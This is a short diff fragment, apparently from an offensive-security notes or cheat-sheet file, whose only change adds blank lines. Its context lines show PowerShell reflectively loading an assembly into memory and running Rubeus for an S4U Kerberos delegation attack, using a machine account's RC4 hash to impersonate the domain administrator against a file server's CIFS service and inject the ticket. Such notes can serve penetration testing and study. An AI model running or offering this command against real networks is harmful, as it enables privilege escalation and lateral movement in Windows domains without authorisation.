@@ -21,3 +21,5 @@ updated_at: '2023-04-10T20:37:02.186238+00:00'
 $assem = [System.Reflection.Assembly]::Load($data)
 [Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
 ```
+
+
